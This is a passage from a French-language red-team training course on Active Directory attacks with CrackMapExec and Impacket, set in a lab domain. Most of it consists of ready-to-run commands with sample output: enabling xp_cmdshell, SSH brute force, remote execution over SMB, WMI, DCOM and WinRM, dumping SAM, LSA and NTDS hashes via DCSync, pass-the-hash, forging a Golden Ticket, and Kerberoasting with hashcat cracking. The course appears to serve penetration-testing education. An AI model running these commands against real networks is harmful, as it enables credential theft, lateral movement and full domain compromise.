crackmapexec mssql 192.168.1.30 -u jdoe -p 'P@ssw0rd' --enable-xp-cmdshell
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `crackmapexec mssql <cible>` | Teste la connexion MSSQL avec les identifiants fournis |
| `-q '<requête>'` | Exécute une requête SQL arbitraire sur le serveur |
| `-x <commande>` | Exécute une commande OS via xp_cmdshell |
| `--enable-xp-cmdshell` | Active xp_cmdshell (souvent désactivé par défaut, nécessite droits sysadmin) |

### 5.7 Module SSH

```bash
# ─── Connexion SSH ────────────────────────────────────────────────────────────
# Teste la connexion SSH avec authentification par mot de passe
# -x id : exécute la commande 'id' une fois connecté
crackmapexec ssh 192.168.1.40 -u 'root' -p 't00r' -x id

# ─── Bruteforce SSH ───────────────────────────────────────────────────────────
# Teste toutes les combinaisons utilisateurs × mots de passe contre le service SSH
crackmapexec ssh 192.168.1.40 -u users.txt -p passwords.txt
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `crackmapexec ssh <cible> -u <user> -p <pass>` | Teste une authentification SSH avec mot de passe |
| `-x <commande>` | Exécute une commande une fois connecté (test d'accès) |
| `-u users.txt -p passwords.txt` | Bruteforce : essaie toutes les combinaisons |

### 5.8 Module WinRM

```bash
# ─── Connexion WinRM ──────────────────────────────────────────────────────────
# Teste l'accès à Windows Remote Management (WinRM) port 5985/5986
crackmapexec winrm 192.168.1.10 -u jdoe -p 'P@ssw0rd'

# ─── Exécution de commandes via WinRM ─────────────────────────────────────────
# -x : exécute une commande cmd.exe via WinRM
crackmapexec winrm 192.168.1.10 -u jdoe -p 'P@ssw0rd' -x whoami

# ─── WinRM avec PowerShell ────────────────────────────────────────────────────
# -X : exécute une commande PowerShell via WinRM
crackmapexec winrm 192.168.1.10 -u jdoe -p 'P@ssw0rd' -X 'Get-Service'
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `crackmapexec winrm <cible>` | Teste la connexion WinRM (port 5985 HTTP ou 5986 HTTPS) |
| `-x <commande>` | Exécute une commande via cmd.exe |
| `-X <commande>` | Exécute une commande via PowerShell |

### 5.9 Base de données CME

Tous les résultats sont stockés dans une base SQLite :

```bash
# ─── Interroger la base de données ────────────────────────────────────────────
# sqlite3 : client en ligne de commande pour bases SQLite
sqlite3 ~/.cme/cme.db

# .tables : commande sqlite3 qui liste toutes les tables disponibles
.tables
# Tables :
# hosts           ← Hôtes scannés
# credentials     ← Identifiants découverts
# shares          ← Partages SMB
# users           ← Utilisateurs
# groups          ← Groupes
# outcomes        ← Résultats de commandes

# ─── Voir tous les hôtes découverts ───────────────────────────────────────────
SELECT * FROM hosts;

# ─── Voir les credentials ─────────────────────────────────────────────────────
SELECT * FROM credentials;

.quit
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `sqlite3 ~/.cme/cme.db` | Ouvre la base de données SQLite de CME en mode interactif |
| `.tables` | Liste les tables de la base (hosts, credentials, shares, etc.) |
| `SELECT * FROM hosts;` | Requête SQL : affiche tous les hôtes découverts lors des scans |
| `SELECT * FROM credentials;` | Requête SQL : affiche tous les identifiants récupérés |
| `.quit` | Quitte le client sqlite3 |

### 5.10 TP Guidé — Énumération AD avec CME

#### Contexte

Vous avez les identifiants `jdoe:P@ssw0rd` sur le domaine `sdv-m2.lab`. Utilisez CrackMapExec pour cartographier le domaine.

#### Étape 1 : Énumération des hôtes SMB

```bash
# ─── Scanner le réseau SMB ────────────────────────────────────────────────────
# Scan SMB du sous-réseau complet : découvre les hôtes, OS, nom NetBIOS
# signing:True/False : indique si la signature SMB est activée (défense contre le relay)
crackmapexec smb 192.168.1.0/24

# Sortie attendue :
# SMB   192.168.1.10  445  DC01     [*] Windows 10.0 Build 20348 x64 (name:DC01) (signing:True)
# SMB   192.168.1.20  445  WS01     [*] Windows 10.0 Build 19041 x64 (name:WS01) (signing:False)
# SMB   192.168.1.30  445  SQL01    [*] Windows 10.0 Build 17763 x64 (name:SQL01) (signing:False)
```

**Explication des commandes :**
| Colonne | Rôle/Explication |
|---------|------------------|
| `192.168.1.10` | Adresse IP de l'hôte |
| `445` | Port SMB (par défaut) |
| `DC01` | Nom NetBIOS de la machine |
| `Windows 10.0 Build 20348` | Version du système d'exploitation (20348 = Windows Server 2022) |
| `signing:True/False` | État de la signature SMB (True = protégé contre le relay, False = vulnérable) |

#### Étape 2 : Test d'authentification

```bash
# ─── Tester les identifiants sur chaque hôte ──────────────────────────────────
# Vérifie si le couple utilisateur/mot de passe fonctionne sur la cible
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd'

# Si (admin) apparaît → droits administrateur sur la machine
# SMB   192.168.1.10  445  DC01     [+] sdv-m2.lab\jdoe:P@ssw0rd (admin)
```

**Explication des commandes :**
| Indicateur | Rôle/Explication |
|------------|------------------|
| `[+]` | Authentification réussie |
| `(admin)` | L'utilisateur a les droits administrateur sur la cible |

#### Étape 3 : Énumération des partages

```bash
# ─── Lister les partages SMB du DC ────────────────────────────────────────────
# --shares : liste les partages SMB et leurs permissions (READ/WRITE)
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --shares

# ─── Inspecter SYSVOL pour des secrets ────────────────────────────────────────
# Monte le partage SYSVOL contenant les GPO et scripts de connexion
sudo mount -t cifs //192.168.1.10/SYSVOL /mnt/sysvol \
  -o username=jdoe,password='P@ssw0rd',domain=sdv-m2.lab,vers=2.0

# Cherche les scripts .bat et .ps1 dans SYSVOL (sources de mots de passe)
find /mnt/sysvol -name "*.bat" -o -name "*.ps1" 2>/dev/null
# Cherche les chaînes sensibles dans les scripts
grep -r -i "password\|passwd\|pwd\|secret" /mnt/sysvol/ --include="*.bat" --include="*.ps1" 2>/dev/null

# Démonte le partage proprement
sudo umount /mnt/sysvol
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `crackmapexec smb ... --shares` | Liste les partages disponibles avec leurs permissions |
| `sudo mount -t cifs ... /mnt/sysvol` | Monte le partage SYSVOL en local pour inspection |
| `find ... -name "*.bat" -o -name "*.ps1"` | Cherche des scripts contenant potentiellement des secrets |
| `grep -r -i "password\|secret" ...` | Recherche des chaînes sensibles dans les scripts trouvés |
| `sudo umount /mnt/sysvol` | Démonte le partage après utilisation |

#### Étape 4 : Énumération utilisateurs

```bash
# ─── Utilisateurs du domaine ─────────────────────────────────────────────────
# Énumération des utilisateurs, groupes et sessions en une ligne par commande
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --users
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --groups
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --sessions
```

#### Étape 5 : Dump SAM (si admin)

```bash
# ─── Dump SAM du DC ───────────────────────────────────────────────────────────
# --sam : extrait les hashs des comptes locaux du SAM (Security Account Manager)
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --sam

# ─── Sauvegarder les hashs ────────────────────────────────────────────────────
# 2>&1 : redirige stderr vers stdout (CME écrit parfois les hashs sur stderr)
# grep ':' : filtre les lignes contenant des hashs (format "username:RID:LM:NT")
# >> : ajoute au fichier sans écraser (append)
crackmapexec smb 192.168.1.10 -u jdoe -p 'P@ssw0rd' --sam 2>&1 | grep ':' >> exports/hashes/sam-hashes.txt
```

**Explication des commandes :**
| Élément | Rôle/Explication |
|---------|------------------|
| `--sam` | Dump de la base SAM (comptes locaux) |
| `2>&1` | Redirige la sortie d'erreur (stderr) vers la sortie standard (stdout) |
| `grep ':'` | Filtre les lignes contenant des ":" (format des hashs `RID:LM:NT`) |
| `>> fichier` | Ajoute le résultat à la fin du fichier (sans écraser le contenu existant) |

#### Étape 6 : Énumération LDAP via CME

```bash
# ─── Requêtes LDAP ────────────────────────────────────────────────────────────
# Utilise le module LDAP de CME pour énumérer le domaine et extraire les hashs
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --users
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --groups
# --kerberoast : demande les TGS pour les comptes avec SPN et sauvegarde les hashs
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --kerberoast exports/hashes/kerberoast-hashes.txt
# --asreproast : demande les AS-REP pour les comptes sans pré-authentification
crackmapexec ldap 192.168.1.10 -u jdoe -p 'P@ssw0rd' --asreproast exports/hashes/asrep-hashes.txt
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `--users` | Énumération des utilisateurs via LDAP |
| `--groups` | Énumération des groupes via LDAP |
| `--kerberoast <fichier>` | Extrait les hashs TGS Kerberos (hashcat mode 13100) |
| `--asreproast <fichier>` | Extrait les hashs AS-REP (hashcat mode 18200) |

#### Étape 7 : Génération de la liste de relais

```bash
# ─── Machines sans signature SMB (pour relay) ─────────────────────────────────
# Génère la liste des cibles potentielles pour SMB Relay (signature désactivée)
crackmapexec smb 192.168.1.0/24 --gen-relay-list exports/smb-relay-targets.txt
cat exports/smb-relay-targets.txt
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `crackmapexec smb ... --gen-relay-list <fichier>` | Scanne le réseau et liste les hôtes sans signature SMB (vulnérables au relay) |
| `cat <fichier>` | Affiche la liste des cibles (une IP par ligne) |

---

## 6. Impacket

### 6.1 Présentation

**Impacket** est une collection d'outils Python pour interagir avec les protocoles réseau. Développé par SecureAuth, c'est **la** suite incontournable pour la post-exploitation Windows.

**Techniques MITRE ATT&CK :**
- T1049 — System Network Connections Discovery
- T1003 — OS Credential Dumping
- T1558 — Steal or Forge Kerberos Tickets

**Outils principaux pour le Red Team :**

| Outil | Usage | Port |
|-------|-------|------|
| `psexec.py` | Exécution distante via SMB | 445 |
| `wmiexec.py` | Exécution distante via WMI (RPC) | 135 |
| `smbexec.py` | Exécution distante via SMB (sans fichier) | 445 |
| `dcomexec.py` | Exécution distante via DCOM | 135 |
| `secretsdump.py` | Extraction de hashs SAM/LSA/NTDS | 445 |
| `GetADUsers.py` | Énumération utilisateurs AD | 389 |
| `GetNPUsers.py` | TGS-REQ sans pré-auth (AS-REP Roast) | 88 |
| `GetUserSPNs.py` | Demande de TGS avec SPN (Kerberoast) | 88 |
| `ticketer.py` | Forge de tickets (Golden/Silver) | — |
| `ticketConverter.py` | Conversion .kirbi ↔ .ccache | — |
| `ntlmrelayx.py` | Relais NTLM | 445 |
| `rpcdump.py` | Énumération des endpoints RPC | 135 |
| `lookupsid.py` | Bruteforce SID via RPC | 445 |

### 6.2 Installation

```bash
# ─── Installation via pip (recommandé) ────────────────────────────────────────
# Installe la suite Impacket depuis PyPI (contient tous les outils : psexec, wmiexec, etc.)
pip install impacket

# ─── Vérification ─────────────────────────────────────────────────────────────
# Teste l'accès à l'un des outils de la suite pour confirmer l'installation
impacket-smbclient --help

# ─── Installation via apt (Kali) ──────────────────────────────────────────────
# Installation alternative via le gestionnaire de paquets Kali
sudo apt update && sudo apt install -y impacket-scripts

# ─── Installation depuis les sources (version la plus récente) ───────────────
# Clone le dépôt GitHub officiel d'Impacket puis installe la version de développement
git clone https://github.com/fortra/impacket /opt/impacket
pip install /opt/impacket/
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `pip install impacket` | Installe la suite Impacket depuis PyPI (dernière version stable) |
| `impacket-smbclient --help` | Vérifie que les outils sont dans le PATH |
| `sudo apt install -y impacket-scripts` | Installation via APT (paquet Kali contenant les scripts impacket) |
| `git clone ... /opt/impacket` | Clone les sources depuis GitHub pour avoir la version la plus récente |
| `pip install /opt/impacket/` | Installe Impacket depuis les sources clonées |

### 6.3 Exécution de commandes à distance

#### psexec.py

`psexec.py` est l'équivalent de `PsExec` de Microsoft Sysinternals. Il copie un service binaire via SMB (partage `ADMIN$`), le démarre, puis le supprime.

```bash
# ─── Syntaxe ──────────────────────────────────────────────────────────────────
# Format : <DOMAINE>/<UTILISATEUR>:<MOT_DE_PASSE>@<CIBLE>
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET>

# ─── Avec mot de passe ────────────────────────────────────────────────────────
# psexec.py copie un service binaire via ADMIN$, le démarre, puis ouvre un shell
# Nécessite des droits administrateur sur la cible
psexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10

# ─── Avec hash NTLM ───────────────────────────────────────────────────────────
# Pass-the-Hash : utilise le hash NT au lieu du mot de passe en clair
# -hashes 'LMHASH:NTHASH' : LM peut être vide (aad3b...)
psexec.py sdv-m2.lab/jdoe@192.168.1.10 -hashes 'LMHASH:NTHASH'

# ─── En mode silencieux ──────────────────────────────────────────────────────
# -silentcommand : réduit les logs et les sorties (plus discret)
psexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -silentcommand

# ─── Avec exécution d'une commande spécifique ─────────────────────────────────
# Ajoute une commande à la fin pour l'exécuter directement (sans shell interactif)
psexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 whoami

# ─── Sortie typique ───────────────────────────────────────────────────────────
# Les lignes [*] montrent les étapes de l'exécution distante
# Impacket v0.12.0 - Copyright 2023 Fortra
#
# [*] Requesting shares on 192.168.1.10.....
# [*] Found writable share ADMIN$
# [*] Uploading file nFnbQsKk.exe
# [*] Opening SVCManager on 192.168.1.10.....
# [*] Creating service qxYVmOHz on 192.168.1.10.....
# [*] Starting service qxYVmOHz.....
# [!] Press help for extra shell commands
# C:\Windows\system32>
```

**Explication des commandes :**
| Élément | Rôle/Explication |
|---------|------------------|
| `psexec.py DOMAINE/user:pass@IP` | Ouvre un shell SYSTEM distant via SMB (copie un service, le démarre, le supprime) |
| `-hashes 'LMHASH:NTHASH'` | Authentification par hash NT uniquement (le LM peut être vide) |
| `-silentcommand` | Mode silencieux (moins de sortie, plus discret) |
| `[*] Requesting shares` | Étape 1 : trouve le partage ADMIN$ accessible |
| `[*] Uploading file` | Étape 2 : copie un binaire exécutable sur la cible via ADMIN$ |
| `[*] Creating service` | Étape 3 : crée un service Windows pointant vers le binaire uploadé |
| `[*] Starting service` | Étape 4 : démarre le service (le binaire s'exécute en tant que SYSTEM) |

**⚠️ Limitations de psexec.py :**
- Nécessite des droits **administrateur** sur la cible
- Laisse des traces dans les logs (Event ID 7045, 7036)
- Copie un binaire sur le disque → détectable par AV/EDR
- Les partages ADMIN$ doivent être accessibles

#### wmiexec.py

`wmiexec.py` utilise WMI (Windows Management Instrumentation) via RPC (port 135) pour exécuter des commandes. **Plus discret que psexec.py** car :
- Pas de copie de binaire sur le disque
- Pas de création de service
- Utilise les mécanismes standards WMI

```bash
# ─── Syntaxe ──────────────────────────────────────────────────────────────────
# wmiexec.py utilise WMI (Windows Management Instrumentation) via RPC (port 135)
# Plus discret que psexec : pas de fichier copié, pas de service créé
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET>

# ─── Avec mot de passe ────────────────────────────────────────────────────────
# Ouvre un shell semi-interactif utilisant WMI pour exécuter des commandes
wmiexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10

# ─── Avec hash NTLM ───────────────────────────────────────────────────────────
# Pass-the-Hash : -hashes 'NTHASH' (LM peut être omis)
wmiexec.py sdv-m2.lab/jdoe@192.168.1.10 -hashes 'NTHASH'

# ─── Exécution d'une commande unique ─────────────────────────────────────────
# Exécute une seule commande et retourne le résultat (sans shell interactif)
wmiexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 'ipconfig /all'
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `wmiexec.py ...@IP` | Ouvre un shell via WMI (port 135 RPC + 445 SMB pour le retour de sortie) |
| `-hashes 'NTHASH'` | Authentification par hash NT (Pass-the-Hash) |
| `'ipconfig /all'` | Commande unique à exécuter (sans entrer en mode shell) |
| **Discret** | Pas de binaire sur le disque, pas de service Windows créé |

**Logs générés :**
- Event ID 4688 (Process Creation)
- Event ID 4624 (Logon Type 3)
- WMI-Activity logs (Event ID 5857, 5858, 5859)

#### smbexec.py

```bash
# ─── Syntaxe ──────────────────────────────────────────────────────────────────
# smbexec.py s'appuie sur SMB mais utilise une technique sans fichier
# (via des services temporaires nommés, supprimés après exécution)
smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET>

# ─── Avec mot de passe ────────────────────────────────────────────────────────
smbexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10

# ─── Avec hash NTLM ───────────────────────────────────────────────────────────
# Pass-the-Hash : utilise le hash NT pour s'authentifier
smbexec.py sdv-m2.lab/jdoe@192.168.1.10 -hashes 'LMHASH:NTHASH'
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `smbexec.py ...@IP` | Exécution distante via SMB (sans fichier, avec service temporaire) |
| `-hashes 'LMHASH:NTHASH'` | Authentification par hash NT (Pass-the-Hash) |

#### dcomexec.py

```bash
# ─── Syntaxe ──────────────────────────────────────────────────────────────────
# dcomexec.py exécute des commandes via DCOM (Distributed COM) sur le port 135
# Très discret : utilise des objets COM légitimes de Windows
dcomexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET>

# ─── Avec ShellBrowserWindow (MMC) : discret ─────────────────────────────────
# -object MMC20 : utilise l'objet COM MMC (Microsoft Management Console)
dcomexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -object MMC20

# ─── Avec ShellWindows ───────────────────────────────────────────────────────
# -object ShellWindows : utilise l'objet COM ShellWindows (explorateur Windows)
dcomexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -object ShellWindows

# ─── Avec Excel (si Excel est installé) ───────────────────────────────────────
# -object ExcelDDE : utilise l'objet COM Excel (nécessite Excel installé sur la cible)
dcomexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -object ExcelDDE
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `dcomexec.py ...@IP` | Exécution via DCOM (port 135) - la plus discrète des méthodes Impacket |
| `-object MMC20` | Objet COM MMC20Application (MMC) - très discret, disponible sur tous les Windows |
| `-object ShellWindows` | Objet COM ShellWindows (explorateur) |
| `-object ExcelDDE` | Objet COM Excel DDE (nécessite Excel installé) |
| **Discrétion** | Pas de fichier, pas de service, logs WMI-Activity limités |

**Comparaison des méthodes d'exécution :**

| Outil | Port(s) | Binaire disque | Service créé | Logs | Détection EDR |
|-------|---------|----------------|--------------|------|---------------|
| `psexec.py` | 445 | Oui | Oui | Nombreux | Haute |
| `wmiexec.py` | 135, 445 | Non | Non | Modérés | Moyenne |
| `smbexec.py` | 445 | Non | Oui (temp.) | Modérés | Moyenne |
| `dcomexec.py` | 135 | Non | Non | Variables | Faible |

### 6.4 Extraction de hashs (secretsdump.py)

`secretsdump.py` est **l'outil le plus critique** de la suite Impacket. Il permet d'extraire :
- **SAM** : hashs des comptes locaux
- **LSA Secrets** : secrets stockés dans LSA
- **NTDS.dit** : base de données AD (hashs de TOUS les utilisateurs du domaine)
- **DC Sync** : réplication des hashs depuis un DC

#### Dump SAM

```bash
# ─── Extraction des hashs SAM (comptes locaux) ────────────────────────────────
# Nécessite : droits administrateur sur la cible
# -sam : extrait la base SAM locale (hashs des comptes administrateur local, invité, etc.)
secretsdump.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -sam

# Sortie type :
# [*] Dumping local SAM entries (admin on target)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `secretsdump.py ... -sam` | Extraction de la base SAM locale (hashs des comptes locaux de la machine) |
| Format `user:RID:LM_HASH:NT_HASH:::` | RID = Relative ID, LM = hash LM (ancien), NT = hash NT (MD4 du password) |

#### Dump LSA Secrets

```bash
# ─── Extraction des LSA Secrets ───────────────────────────────────────────────
# -lsa : extraction des secrets LSA (mots de passe des services, cache domaine)
# Contient : mots de passe des services, cache de domaine
secretsdump.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -lsa

# Sortie type :
# [*] Dumping LSA Secrets (admin on target)
# $MACHINE.ACC: ...          ← Mot de passe du compte machine dans le domaine
# DefaultPassword: (si stocké) ← Mot de passe stocké en clair dans LSA
# NL$KM: ...                  ← Clé pour déchiffrer les hashs du cache (NL creds)
```

**Explication des commandes :**
| Élément | Rôle/Explication |
|---------|------------------|
| `-lsa` | Extraction des secrets LSA (Local Security Authority) |
| `$MACHINE.ACC` | Mot de passe du compte machine (utilisé pour l'authentification au domaine) |
| `DefaultPassword` | Mot de passe stocké en clair (parfois des identifiants administrateur) |
| `NL$KM` | Clé de déchiffrement du cache des identifiants réseau (NL creds) |

#### Dump NTDS.dit (DCSync) — L'essentiel

```bash
# ─── Extractions des hashs du domaine (NTDS.dit) VIA DCSync ──────────────────
# Méthode 1 : DCSync (plus discret, pas d'accès fichier)
# -just-dc : utilise le protocole DRSUAPI pour répliquer les secrets du DC
# (imite le comportement d'un DC légitime demandant une réplication)
secretsdump.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -just-dc

# Sortie type (extrait) :
# [*] Dumping Domain Credentials (domain:sdv-m2.lab)
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
# svc_sql:1104:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
# jdoe:1105:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::

# Méthode 2 : DCSync avec export vers fichier
# -outputfile : sauvegarde les hashs dans un fichier pour analyse offline
secretsdump.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -just-dc -outputfile exports/dcsync-export

# Génère :
# exports/dcsync-export.ntds          → Hashs NT (username:RID:LM:NT:::)
# exports/dcsync-export.ntds.cleartext → Mots de passe en clair (si historique conservé)

# Méthode 3 : DCSync seulement utilisateurs spécifiques (hashs NT uniquement)
# -just-dc-ntlm : extrait seulement les hashs NTLM (pas l'historique complet)
secretsdump.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -just-dc-ntlm

# Méthode 4 : Extraction NTDS.dit + SYSTEM hive (nécessite accès disque)
# Utilisé quand on a un accès physique au fichier NTDS.dit
# LOCAL indique l'extraction locale (pas via réseau)
secretsdump.py -ntds /mnt/ntds/ntds.dit -system /mnt/ntds/system.hive LOCAL
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `-just-dc` | DCSync : imite un DC légitime pour demander la réplication des hashs (technique T1003.006) |
| `-just-dc -outputfile <fichier>` | Sauvegarde les hashs extraits dans un fichier pour analyse offline |
| `-just-dc-ntlm` | Extrait uniquement les hashs NTLM (plus rapide, sans historique) |
| `-ntds ... -system ... LOCAL` | Extraction locale des fichiers NTDS.dit et SYSTEM.hive (nécessite un accès disque) |
| Protocole DRSUAPI | API de réplication Active Directory (légitime, mais abusable par un attaquant avec droits) |
| Hash KRBTGT | Le hash du compte krbtgt permet de forger des Golden Tickets (persistance ultime) |

**Format des hashs extraits :**

```
username:RID:LM_HASH:NT_HASH:::
│         │   │       │
│         │   │       └── NT Hash (MD4 du mot de passe)
│         │   └── LM Hash (souvent aad3b... = vide)
│         └── Relative ID (identifiant unique)
└── Nom d'utilisateur
```

**Utilisation des hashs extraits :**

```bash
# ─── Pass-the-Hash avec les hashs récupérés ───────────────────────────────────
# Connexion avec le hash NT (sans mot de passe) :
# -H 'NTHASH' : CME authentifie directement avec le hash NT
crackmapexec smb 192.168.1.10 -u Administrator -H 'NTHASH'
# -hashes ':NTHASH' : le LM hash est vide (avant les :), seul le NT hash est utilisé
psexec.py sdv-m2.lab/Administrator@192.168.1.10 -hashes ':NTHASH'
wmiexec.py sdv-m2.lab/Administrator@192.168.1.10 -hashes ':NTHASH'

# ─── Craquage offline des hashs NT ──────────────────────────────────────────
# Mode hashcat pour NTLM = 1000 (format username:RID:LM:NT:::)
hashcat -m 1000 exports/dcsync-export.ntds /usr/share/wordlists/rockyou.txt

# ─── Forge d'un Golden Ticket avec le hash KRBTGT ───────────────────────────
# Le hash du compte krbtgt permet de forger n'importe quel ticket Kerberos
# -nthash : hash NT du compte krbtgt  |  -domain-sid : SID du domaine
# -domain : nom du domaine  |  Administrator : le compte à usurper
impacket-ticketer -nthash 'KRBTGT_NTHASH' -domain-sid 'DOMAIN_SID' \
  -domain sdv-m2.lab Administrator

# ─── Utilisation du Golden Ticket ───────────────────────────────────────────
# KRB5CCNAME : variable d'environnement pointant vers le cache du ticket forgé
export KRB5CCNAME=Administrator.ccache
# -k : utilise le ticket Kerberos (ccache)  |  -no-pass : pas de mot de passe
psexec.py -k sdv-m2.lab/Administrator@dc01.sdv-m2.lab -no-pass
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `-H 'NTHASH'` | Pass-the-Hash CME : utilise le hash NT directement pour l'authentification |
| `-hashes ':NTHASH'` | Pass-the-Hash Impacket : format LM:HASH (LM vide = pas utilisé) |
| `hashcat -m 1000` | Mode hashcat NTLM (format standard des hashs de mots de passe Windows) |
| `impacket-ticketer -nthash ... -domain-sid ...` | Forge un Golden Ticket Kerberos (valable 10 ans par défaut) |
| `KRB5CCNAME=...` | Variable d'environnement indiquant le chemin du cache de ticket Kerberos |
| `-k` | Utilise le cache Kerberos (ne demande pas de mot de passe) |
| `-no-pass` | Empêche la demande de mot de passe (utilise le ticket uniquement) |

### 6.5 Kerberoasting (GetUserSPNs.py)

Le **Kerberoasting** est une technique qui consiste à demander un TGS (Ticket-Granting Service) pour un compte de service ayant un SPN, puis à extraire le hash du ticket pour le craquer offline.

```bash
# ─── Énumération des comptes SPN ──────────────────────────────────────────────
# Lister tous les comptes avec un SPN (Kerberoastable)
# -dc-ip : adresse IP du DC (évite la résolution DNS)
GetUserSPNs.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10

# Sortie attendue :
# ServicePrincipalName                    Name       MemberOf
# --------------------------------------  ---------  ---------
# MSSQLSvc/sql01.sdv-m2.lab:1433         svc_sql    Domain Admins
# HTTP/webapp.sdv-m2.lab                 svc_http   Domain Users

# ─── Demande de TGS et extraction du hash ─────────────────────────────────────
# -request : demande un TGS (Ticket-Granting Service) pour chaque compte SPN
# Le hash extrait est craquable offline (format $krb5tgs$...)
GetUserSPNs.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10 -request

# Sortie :
# Impacket v0.12.0 - Copyright 2023 Fortra
#
# $krb5tgs$23$*svc_sql$SDV-M2.LAB$sdv-m2.lab/svc_sql*$...
# $krb5tgs$23$*svc_http$SDV-M2.LAB$sdv-m2.lab/svc_http*$...

# ─── Export des hashs vers un fichier ─────────────────────────────────────────
# -outputfile : sauvegarde les hashs Kerberos dans un fichier pour hashcat/john
GetUserSPNs.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10 -request \
  -outputfile exports/hashes/kerberoast-hashes.txt

# ─── Demande de TGS pour un utilisateur spécifique ────────────────────────────
# -request-user : ne demande le TGS que pour un compte spécifique (plus discret)
GetUserSPNs.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10 -request \
  -request-user svc_sql

# ─── Avec hash NTLM (sans mot de passe) ───────────────────────────────────────
# Utilise le hash NT pour l'authentification (Pass-the-Hash + Kerberoast)
GetUserSPNs.py sdv-m2.lab/jdoe@192.168.1.10 -hashes ':NTHASH' -request
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `GetUserSPNs.py` | Outil Impacket qui liste les comptes avec SPN et demande les TGS |
| `-dc-ip <IP>` | Spécifie l'adresse IP du DC (évite les problèmes de résolution DNS) |
| `-request` | Demande un TGS pour chaque compte SPN (extraction du hash Kerberos) |
| `-outputfile <fichier>` | Sauvegarde les hashs TGS dans un fichier (format hashcat mode 13100) |
| `-request-user <user>` | Limite la demande à un seul utilisateur (plus discret, évite les logs massifs) |
| Format `$krb5tgs$23$*...` | Hash Kerberos TGS (mode hashcat 13100) : service, domaine, nom d'utilisateur |

**Craquage des hashs Kerberos :**

```bash
# ─── Mode hashcat pour Kerberos TGS = 13100 ──────────────────────────────────
# -m 13100 : mode hashcat pour les hashs Kerberos TGS
hashcat -m 13100 exports/hashes/kerberoast-hashes.txt /usr/share/wordlists/rockyou.txt

# ─── Mode hashcat avec règles ─────────────────────────────────────────────────
# -r : ajoute un fichier de règles pour générer des variantes des mots de passe
# OneRuleToRuleThemAll.rule : règle de transformation complète (mutations avancées)
hashcat -m 13100 exports/hashes/kerberoast-hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule --force

# ─── Mode John pour Kerberos ─────────────────────────────────────────────────
# Alternative à hashcat : utilise John the Ripper
john exports/hashes/kerberoast-hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `-m 13100` | Mode hashcat pour Kerberos TGS (format $krb5tgs$) |
| `-r <fichier.rule>` | Applique des règles de transformation de mots de passe (mutations) |
| `john ... --wordlist=...` | Utilise John the Ripper en mode wordlist (alternative à hashcat) |

### 6.6 AS-REP Roasting (GetNPUsers.py)

